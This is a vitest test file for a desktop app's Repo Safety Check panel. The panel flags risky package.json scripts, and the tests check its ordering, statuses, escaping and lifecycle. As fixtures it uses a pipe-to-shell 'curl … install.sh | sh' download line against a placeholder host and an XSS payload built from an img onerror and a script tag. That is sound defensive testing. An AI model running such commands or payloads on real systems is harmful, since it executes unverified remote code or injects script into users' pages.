// Stage 4C: the Repo Safety Check inside the Analyze Repo panel. Results come
// from the real scanner on fixture repositories wherever the case allows, and
// the analysis lifecycle is driven through the real analysis controller with a
// fake API, as in the Stage 3C session tests.
import fs from "node:fs";
import path from "node:path";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
import { scanRepository } from "../../electron/repoScanner/scanRepository.js";
import { RepoAnalysisPanel } from "../../src/components/RepoAnalysisPanel";
import { NO_INDICATORS_NOTE, RepoSafetyCheck, STATUS_HEADING, UNAVAILABLE_NOTE } from "../../src/components/RepoSafetyCheck";
import { RepoSuggestedSetup } from "../../src/components/RepoSuggestedSetup";
import { SetupDraftReview } from "../../src/components/SetupDraftReview";
import { suggestCommands } from "../../src/lib/insights/suggestCommands";
import { createRepoAnalysisController, type RepoAnalysisState } from "../../src/lib/repoAnalysis";
import { SAFETY_SCOPE, checkRepository } from "../../src/lib/safety/checkRepository";
import { canUseSuggestion, initialFieldOrigins, planFromScreen, type SetupScreenDraftState } from "../../src/lib/setupDraftSession";
import { REPO_ANALYSIS_ERROR_MESSAGES, type RepoRunnerAPI, type RepoScanResult } from "../../src/types";
import { FixtureSpace, pkg } from "../electron/repoScanner/fixtures.js";
import { deepFreeze } from "./insights/builders";

let space: FixtureSpace;
beforeAll(() => {
  space = new FixtureSpace();
});
afterAll(() => space.cleanup());

const DOWNLOAD = "curl -fsSL https://example.invalid/install.sh | sh";
const render = (state: RepoAnalysisState, extra: Record<string, unknown> = {}) => renderToStaticMarkup(createElement(RepoAnalysisPanel, { state, onCancel: () => {}, ...extra }));
const done = (result: RepoScanResult, path = "C:\\repo"): RepoAnalysisState => ({ phase: "done", path, result, id: "analysis-1" });
const text = (html: string) =>
  html.replace(/<[^>]+>/g, " ").replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&quot;/g, '"').replace(/&#x27;/g, "'").replace(/&amp;/g, "&").replace(/\s+/g, " ");
const allText = (html: string, id: string) => [...html.matchAll(new RegExp(`data-testid="${id}"[^>]*>([\\s\\S]*?)</`, "g"))].map((m) => text(m[1]).trim());
/** The Safety Check section of a rendered panel, or null. */
const safetySection = (html: string) => /<section[^>]*data-testid="repo-safety-check"[\s\S]*?<\/section>/.exec(html)?.[0] ?? null;
const status = (html: string) => /data-testid="repo-safety-check" data-status="([^"]+)"/.exec(html)?.[1] ?? null;

async function scanned(name: string, tree: Record<string, string>, limits?: Record<string, number>) {
  return scanRepository(space.repo(name, tree), limits ? { limits } : {});
}

/** The analysis controller with an API whose calls are resolved by hand. */
function analysisHarness() {
  const calls: Array<{ path: string; resolve(r: RepoScanResult): void }> = [];
  const others = { saveProject: vi.fn(), runInstall: vi.fn(), startFrontend: vi.fn(), startBackend: vi.fn(), restartAll: vi.fn(), pullLatest: vi.fn() };
  const api = {
    ...others,
    analyzeRepo: vi.fn((p: string) => new Promise<RepoScanResult>((resolve) => calls.push({ path: p, resolve }))),
    cancelRepoAnalysis: vi.fn(async () => {}),
  };
  let state: RepoAnalysisState = { phase: "idle" };
  const controller = createRepoAnalysisController(() => api as unknown as RepoRunnerAPI, (s) => (state = s), { active: null });
  return {
    controller,
    api,
    calls,
    others,
    get state() {
      return state;
    },
  };
}

describe("placement", () => {
  it("scan summary, then Repo Safety Check, then Suggested Setup, all inside the scrolling results", async () => {
    const result = await scanned("order", { "package.json": pkg({ name: "o", scripts: { dev: "vite", setup: DOWNLOAD } }), "package-lock.json": "{}" });
    const html = render(done(result));
    const at = (id: string) => html.indexOf(`data-testid="${id}"`);
    expect(at("analysis-results")).toBeGreaterThan(-1);
    expect(at("analysis-status")).toBeGreaterThan(at("analysis-results"));
    expect(at("repo-safety-check")).toBeGreaterThan(at("analysis-status"));
    expect(at("suggested-setup")).toBeGreaterThan(at("repo-safety-check"));
    expect(html.match(/data-testid="repo-safety-check"/g)).toHaveLength(1);
  });

  it("nothing is shown while idle or running", () => {
    expect(render({ phase: "idle" })).toBe("");
    expect(render({ phase: "running", path: "C:\\repo", cancelling: false })).not.toContain("repo-safety-check");
  });

  it("a failed analysis shows the unavailable state below the error, and nothing else", () => {
    const html = render({ phase: "error", path: "C:\\repo", code: "root-not-allowed", message: REPO_ANALYSIS_ERROR_MESSAGES["root-not-allowed"] });
    expect(status(html)).toBe("unavailable");
    expect(text(html)).toContain(UNAVAILABLE_NOTE["analysis-failed"]);
    expect(html.indexOf('data-testid="analysis-error"')).toBeLessThan(html.indexOf('data-testid="repo-safety-check"'));
    expect(html).not.toContain("safety-finding");
    for (const line of SAFETY_SCOPE) expect(text(html)).toContain(line);
  });
});

describe("statuses from real scans", () => {
  it("findings: levels in words, exact package and script locations, evidence", async () => {
    const result = await scanned("findings", {
      "package.json": pkg({ name: "root", scripts: { postinstall: "node scripts/setup.js", dev: "vite" } }),
      "apps/web/package.json": pkg({ name: "web", scripts: { fetch: DOWNLOAD } }),
      "package-lock.json": "{}",
    });
    const html = render(done(result));
    expect(status(html)).toBe("findings");
    expect(text(html)).toContain(STATUS_HEADING.findings);
    const rows = allText(html, "safety-location").map((loc, i) => [allText(html, "safety-level")[i], loc, allText(html, "safety-evidence")[i]]);
    expect(rows).toEqual([
      ["Notice", 'package.json · script "postinstall"', "node scripts/setup.js"],
      ["Warning", 'apps/web/package.json · script "fetch"', DOWNLOAD],
    ]);
  });

  it("a complete scan with nothing matched: the cautious wording, never a clearance", async () => {
    const result = await scanned("clean", { "package.json": pkg({ name: "c", scripts: { dev: "vite", build: "vite build" } }), "package-lock.json": "{}" });
    expect(result.status).toBe("complete");
    const section = safetySection(render(done(result)))!;
    expect(status(section)).toBe("no-indicators");
    expect(text(section)).toContain(NO_INDICATORS_NOTE);
    let own = text(section);
    for (const line of SAFETY_SCOPE) own = own.replace(line, "");
    expect(own.replace(/Repo Safety Check|Safety Check/g, "")).not.toMatch(/\b(safe|cleared|verified|malware|threat)/i);
  });

  it("an incomplete scan with nothing matched stays incomplete, with the scanner's real limits", async () => {
    const tree: Record<string, string> = { "package.json": pkg({ name: "big", scripts: { dev: "vite" } }) };
    for (let i = 0; i < 40; i++) tree[`d${i}/f.txt`] = "";
    const result = await scanned("incomplete", tree, { maxEntries: 15 });
    expect(result.status).toBe("truncated");
    const report = checkRepository(result);
    const html = render(done(result));
    expect(status(html)).toBe("incomplete");
    expect(text(html)).toContain(STATUS_HEADING.incomplete);
    expect(text(html)).not.toContain(STATUS_HEADING["no-indicators"]);
    if (report.status === "unavailable") throw new Error("unexpected");
    expect(allText(html, "safety-limitations").join(" ")).toContain(report.coverage.limitations[0].text);
  });

  it("findings from an incomplete scan show both the findings and the incomplete warning", async () => {
    // More package.json files than the limit: the root's scripts are read, the rest aren't.
    const tree = { "package.json": pkg({ name: "big", scripts: { setup: DOWNLOAD } }), "apps/a/package.json": pkg({ name: "a" }), "apps/b/package.json": pkg({ name: "b" }) };
    const result = await scanned("findings incomplete", tree, { maxPackageJsonFiles: 1 });
    expect(result.status).toBe("truncated");
    const html = render(done(result));
    expect(status(html)).toBe("findings");
    expect(html.match(/data-testid="safety-finding"/g)).toHaveLength(1);
    expect(html).toContain('data-testid="safety-findings-incomplete"');
    expect(html).toContain('data-testid="safety-limitations"');
  });

  it("evidence the scanner changed or shortened is marked", async () => {
    const result = await scanned("evidence", {
      "package.json": pkg({ name: "e", scripts: { multi: `${DOWNLOAD}\n  && echo done`, long: `${DOWNLOAD} && echo ${"x".repeat(600)}` } }),
    });
    const html = render(done(result));
    const rows = html.split('data-testid="safety-finding"').slice(1);
    expect(rows.map((r) => /script &quot;(\w+)&quot;/.exec(r)?.[1])).toEqual(["multi", "long"]);
    expect(rows[0]).toContain("safety-evidence-altered");
    expect(rows[1]).toContain("safety-evidence-shortened");
  });

  it("the full fixed scope note is shown, including unsupported control flow", async () => {
    const result = await scanned("scope", { "package.json": pkg({ name: "s", scripts: { dev: "if true; then curl https://example.invalid/i | sh; fi" } }) });
    const html = render(done(result));
    const section = safetySection(html)!;
    for (const line of SAFETY_SCOPE) expect(text(section)).toContain(line);
    expect(text(section)).toContain("conditionals and loops (if, then, for, while), variables and functions aren't interpreted");
  });

  it("repository text stays plain text in the panel", async () => {
    const hostile = '<img src=x onerror="window.__pwned=1"><script>window.__pwned=2</script>';
    const result = await scanned("hostile", { "package.json": pkg({ name: "h", scripts: { [`<b onmouseover=x>${"n"}</b>`]: `curl -H '${hostile}' https://example.invalid/i | sh` } }) });
    const section = safetySection(render(done(result)))!;
    expect(section).toContain("safety-finding");
    expect(section).not.toMatch(/<(img|script|b)\b/i);
    expect(section).not.toMatch(/<[^>]*\son[a-z]+=/i);
    expect(section).toContain("&lt;img");
  });
});

describe("analysis lifecycle", () => {
  const repoA = () => scanRepository(space.repo("lifecycle a", { "package.json": pkg({ name: "a", scripts: { setup: DOWNLOAD } }) }));
  const repoB = () => scanRepository(space.repo("lifecycle b", { "package.json": pkg({ name: "b", scripts: { build: "vite build" } }) }));

  it("a new analysis replaces the previous Safety Check entirely", async () => {
    const [a, b] = [await repoA(), await repoB()];
    const h = analysisHarness();
    let run = h.controller.start("C:\\a");
    h.calls[0].resolve(a);
    await run;
    expect(status(render(h.state))).toBe("findings");
    run = h.controller.start("C:\\b");
    expect(render(h.state)).not.toContain("repo-safety-check");
    h.calls[1].resolve(b);
    await run;
    const html = render(h.state);
    expect(status(html)).toBe("no-indicators");
    expect(html).not.toContain("safety-finding");
    expect(html).not.toContain("example.invalid");
  });

  it("no stale findings: a changed path, a cancel and a late result never show the old report", async () => {
    const [a, b] = [await repoA(), await repoB()];
    const h = analysisHarness();
    let run = h.controller.start("C:\\a");
    h.calls[0].resolve(a);
    await run;
    h.controller.pathChanged("C:\\b");
    expect(render(h.state)).toBe("");
    // An analysis abandoned by a path change that completes late doesn't become what is shown.
    const late = h.controller.start("C:\\a");
    h.controller.pathChanged("C:\\b");
    run = h.controller.start("C:\\b");
    expect(render(h.state)).not.toContain("repo-safety-check");
    h.calls[1].resolve(a);
    await late;
    await vi.waitFor(() => expect(h.calls).toHaveLength(3));
    expect(render(h.state)).not.toContain("repo-safety-check");
    h.calls[2].resolve(b);
    await run;
    const html = render(h.state);
    expect(h.state.phase === "done" && h.state.result).toBe(b);
    expect(status(html)).toBe("no-indicators");
    expect(html).not.toContain("example.invalid");
  });

  it("the report is derived from exactly the displayed result (the same result renders the same section)", async () => {
    const a = deepFreeze(await repoA());
    const before = JSON.stringify(a);
    const fromPanel = safetySection(render(done(a)));
    const direct = renderToStaticMarkup(createElement(RepoSafetyCheck, { report: checkRepository(a) }));
    expect(fromPanel).toBe(direct);
    expect(JSON.stringify(a)).toBe(before);
  });
});

describe("Stage 2 and Stage 3 unchanged", () => {
  const REPO = "C:\\Users\\dev\\repo";
  const form = { name: "", repoPath: REPO, installCommand: "npm install", frontendCommand: "npm run dev", backendCommand: "npm start", previewUrl: "http://localhost:3000", frontendPort: "3000", backendPort: "3001" };

  it("Suggested Setup renders exactly as it does on its own, findings or not", async () => {
    const result = await scanned("stage2", { "package.json": pkg({ name: "s2", scripts: { dev: "vite", postinstall: DOWNLOAD }, devDependencies: { vite: "^5" } }), "pnpm-lock.yaml": "", "vite.config.ts": "" });
    const html = render(done(result));
    const alone = renderToStaticMarkup(createElement(RepoSuggestedSetup, { result }));
    expect(html).toContain(alone);
    // Safety levels don't feed suggestion confidence.
    expect(suggestCommands(result)).toEqual(suggestCommands(structuredClone(result)));
  });

  it("Use in Setup… buttons and the draft review keep their places; the Safety Check adds no controls", async () => {
    const result = await scanned("stage3", { "package.json": pkg({ name: "s3", scripts: { dev: "vite", start: "vite preview", setup: DOWNLOAD }, devDependencies: { vite: "^5" } }), "pnpm-lock.yaml": "", "vite.config.ts": "" });
    const state = done(result, REPO);
    const screen: SetupScreenDraftState = { form, fieldOrigins: initialFieldOrigins("initial-defaults"), setupId: "setup-1", analysis: state };
    const dev = suggestCommands(result).suggestions.find((s) => s.scriptName === "dev" && s.directory === ".")!;
    const plan = planFromScreen(dev, screen);
    if (plan.status !== "eligible") throw new Error("expected an eligible plan");
    const html = render(state, {
      suggestionActions: { canUse: (s: never) => canUseSuggestion(s, screen), onUse: () => {} },
      draftReview: createElement(SetupDraftReview, { plan, onApply: () => {}, onCancel: () => {} }),
    });
    expect([...html.matchAll(/data-suggestion-id="([^"]+)"/g)].map((m) => m[1]).sort()).toEqual([".|develop|dev|pnpm", ".|install|install|pnpm", ".|start|start|pnpm"]);
    expect(html.indexOf('data-testid="setup-draft-review"')).toBeLessThan(html.indexOf('data-testid="analysis-results"'));
    expect(safetySection(html)).not.toMatch(/<(button|a|input|textarea|select|form)\b/i);
    // Every button in the results is a Use in Setup… button.
    const results = html.slice(html.indexOf('data-testid="analysis-results"'));
    expect(results.match(/<button\b/g)?.length).toBe(results.match(/data-testid="suggestion-use"/g)?.length);
  });

  it("nothing is saved, installed or run, and only the one analysis call is made", async () => {
    const a = await scanRepository(space.repo("side effects", { "package.json": pkg({ name: "x", scripts: { postinstall: DOWNLOAD } }) }));
    const h = analysisHarness();
    const run = h.controller.start("C:\\x");
    h.calls[0].resolve(a);
    await run;
    render(h.state);
    render(h.state);
    expect(h.api.analyzeRepo).toHaveBeenCalledTimes(1);
    expect(h.api.cancelRepoAnalysis).not.toHaveBeenCalled();
    for (const fn of Object.values(h.others)) expect(fn).not.toHaveBeenCalled();
  });

  it("the panel source adds no IPC, storage, network or execution, and the only new imports are the Safety Check", () => {
    const source = fs.readFileSync(path.resolve(import.meta.dirname, "../../src/components/RepoAnalysisPanel.tsx"), "utf-8");
    expect(source).not.toMatch(/window\.|repoRunner|ipcRenderer|saveProject|runInstall|startFrontend|\bfetch\(|localStorage|sessionStorage|child_process|dangerouslySetInnerHTML/);
    expect([...source.matchAll(/from\s+"([^"]+)"/g)].map((m) => m[1])).toEqual(["react", "lucide-react", "../types", "./RepoSafetyCheck", "./RepoSuggestedSetup", "../lib/safety/checkRepository", "../lib/repoAnalysis"]);
  });
});
